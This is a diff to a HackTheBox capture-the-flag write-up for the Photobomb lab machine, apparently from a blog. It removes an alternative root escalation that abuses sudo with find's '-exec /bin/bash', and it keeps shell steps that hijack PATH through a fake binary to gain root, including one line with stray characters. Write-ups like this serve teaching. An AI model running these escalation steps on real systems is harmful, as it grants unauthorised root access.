@@ -6,7 +6,7 @@ tags: [Machines,Linux]
 image: /assets/img/photobomb/Photobomb.png
 ---
 
-This is [hackthebox](https://app.hackthebox.com/machines/Photobomb) easy rated machine designed to show the command injection for the user access and path injection knowledge for the root user. In this box i will show three ways of how to be root user.
+This is [hackthebox](https://app.hackthebox.com/machines/Photobomb) easy rated machine designed to show the command injection for the user access and path injection knowledge for the root user. In this box i will show different ways of how to be root user.
 Lets start.
 ## Enumeration
 ### Nmap Scan
@@ -244,13 +244,6 @@ wizard@photobomb:/tmp$ chmod +x [
 wizard@photobomb:/tmp$ export PATH=/tmp:$PATH0d17567e349d26e167a
 wizard@photobomb:/tmp$ sudo PATH=pwd:$PATH /opt/cleanup.sh 
 root@photobomb:/tmp# 
-```
-## Alternative.
-Since user can use `find` command with root privileges then i can use the option `exec` to execute `/bin/bash`
-```
-wizard@photobomb:/tmp$ sudo PATH=$PATH /opt/cleanup.sh -exec /bin/bash \;
-root@photobomb:/tmp# whoami
-root
 ```
 The End.
 ```
